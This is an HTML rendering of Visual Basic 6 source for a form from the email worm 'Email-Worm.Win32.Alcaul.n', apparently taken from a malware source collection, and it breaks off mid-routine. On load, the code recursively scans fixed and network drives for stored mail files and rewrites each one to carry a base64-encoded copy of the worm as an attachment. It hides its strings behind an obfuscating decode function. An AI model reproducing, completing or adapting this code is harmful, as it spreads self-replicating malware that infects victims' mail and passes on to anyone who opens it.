<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Alcaul.n - reason2.frm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc7">VERSION</span><span class="sc0"> </span><span class="sc2">5.00</span><span class="sc0">
</span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Form</span><span class="sc0"> </span><span class="sc7">Form2</span><span class="sc0"> 
   </span><span class="sc7">BackColor</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">&amp;H00000000</span><span class="sc6">&amp;</span><span class="sc0">
   </span><span class="sc7">BorderStyle</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">'Fixed ToolWindow
</span><span class="sc0">   </span><span class="sc7">Caption</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Boozer's Delight"</span><span class="sc0">
   </span><span class="sc7">ClientHeight</span><span class="sc0">    </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">3180</span><span class="sc0">
   </span><span class="sc7">ClientLeft</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">4005</span><span class="sc0">
   </span><span class="sc7">ClientTop</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">2790</span><span class="sc0">
   </span><span class="sc7">ClientWidth</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">3450</span><span class="sc0">
   </span><span class="sc7">LinkTopic</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Form2"</span><span class="sc0">
   </span><span class="sc7">MaxButton</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc7">MinButton</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc7">Picture</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"reason2.frx"</span><span class="sc6">:</span><span class="sc2">0000</span><span class="sc0">
   </span><span class="sc7">ScaleHeight</span><span class="sc0">     </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">3180</span><span class="sc0">
   </span><span class="sc7">ScaleWidth</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">3450</span><span class="sc0">
   </span><span class="sc7">ShowInTaskbar</span><span class="sc0">   </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">   </span><span class="sc3">Begin</span><span class="sc0"> </span><span class="sc7">VB.Label</span><span class="sc0"> </span><span class="sc7">Label1</span><span class="sc0"> 
      </span><span class="sc7">BackColor</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">&amp;H00000000</span><span class="sc6">&amp;</span><span class="sc0">
      </span><span class="sc7">Caption</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"I'm in your computer.."</span><span class="sc0">
      </span><span class="sc7">BeginProperty</span><span class="sc0"> </span><span class="sc7">Font</span><span class="sc0"> 
         </span><span class="sc7">Name</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc4">"Chiller"</span><span class="sc0">
         </span><span class="sc7">Size</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">18</span><span class="sc0">
         </span><span class="sc7">Charset</span><span class="sc0">         </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc7">Weight</span><span class="sc0">          </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">700</span><span class="sc0">
         </span><span class="sc7">Underline</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">         </span><span class="sc7">Italic</span><span class="sc0">          </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">         </span><span class="sc7">Strikethrough</span><span class="sc0">   </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">'False
</span><span class="sc0">      </span><span class="sc7">EndProperty</span><span class="sc0">
      </span><span class="sc7">ForeColor</span><span class="sc0">       </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">&amp;H000000C0</span><span class="sc6">&amp;</span><span class="sc0">
      </span><span class="sc7">Height</span><span class="sc0">          </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">495</span><span class="sc0">
      </span><span class="sc7">Left</span><span class="sc0">            </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">360</span><span class="sc0">
      </span><span class="sc7">TabIndex</span><span class="sc0">        </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc7">Top</span><span class="sc0">             </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">2400</span><span class="sc0">
      </span><span class="sc7">Width</span><span class="sc0">           </span><span class="sc6">=</span><span class="sc0">   </span><span class="sc2">2775</span><span class="sc0">
   </span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Form2"</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_GlobalNameSpace</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Creatable</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_PredeclaredId</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Exposed</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">dribe</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">dribe</span><span class="sc6">()</span><span class="sc0">
  </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
  </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">dribe</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"³ƒ’‰”‰‡Î¦‰Œ…³™“”…¯‚Š…ƒ”"</span><span class="sc6">))</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.Drives</span><span class="sc0">
  </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">dc</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">d.DriveType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
      </span><span class="sc7">fldr</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">d.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"¼"</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
  </span><span class="sc3">Next</span><span class="sc0">
  </span><span class="sc7">dribe</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">info</span><span class="sc6">(</span><span class="sc7">spec</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
  </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ap</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">mircfname</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"³ƒ’‰”‰‡Î¦‰Œ…³™“”…¯‚Š…ƒ”"</span><span class="sc6">))</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">spec</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.Files</span><span class="sc0">
  </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">fc</span><span class="sc0">
    </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetExtensionName</span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">f1.Name</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"…Œ"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">mimeinfect</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">fldr</span><span class="sc6">(</span><span class="sc7">spec</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
  </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">
    </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"³ƒ’‰”‰‡Î¦‰Œ…³™“”…¯‚Š…ƒ”"</span><span class="sc6">))</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">spec</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.SubFolders</span><span class="sc0">
  </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc0">
    </span><span class="sc7">info</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">fldr</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">f1.Path</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">mimeinfect</span><span class="sc6">(</span><span class="sc7">fileinput</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">dd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ver</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">textline</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ddd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extasy</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extasy1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sex</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">gh</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rout</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">source</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fileread</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">d</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">e</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">fileinput</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#6</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">sig</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"­©­¥"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#6</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sig</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#6</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ver</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#6</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">ver</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"ÖÖÖ"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">fileinput</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">textline</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"­©­¥"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">textline</span><span class="sc0">
</span><span class="sc7">ddd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ddd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">textline</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">textline</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"­©­¥"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">bb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ddd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">textline</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"ÖÖÖ"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extasy</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extasy1</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">extasy1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"‚•„"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sex</span><span class="sc0">
</span><span class="sc7">extasy1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">sex</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">EOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0">
</span><span class="sc7">gh</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gh</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">dd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">dd</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc1">'the routine
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">fileinput</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#7</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">rout</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"­©­¥"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#7</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rout</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">dd</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">Line</span><span class="sc0"> </span><span class="sc7">Input</span><span class="sc0"> </span><span class="sc2">#7</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">source</span><span class="sc0">
</span><span class="sc7">fileread</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fileread</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">source</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#7</span><span class="sc0">
</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">extasy1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">41</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"Î…˜…"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">App.Path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">(</span><span class="sc4">"Î…˜…"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">d</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">b64</span><span class="sc6">(</span><span class="sc7">c</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">e</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"£”…”Í´™…ÚÀŒ‰ƒ”‰Ï˜Í“„—Œ„ÛíêÀÀÀ…İÂ“…ƒ’…”Î…˜…Âíê£”…”Í´’“†…’Í¥ƒ„‰‡ÚÀ‚“…ÖÔíê£”…”Í¤‰““‰”‰ÚÀ””ƒˆ…”ÛíêÀÀÀ†‰Œ……İÂ“…ƒ’…”Î…˜…Â"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">fileinput</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">bb</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fileread</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"--"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">
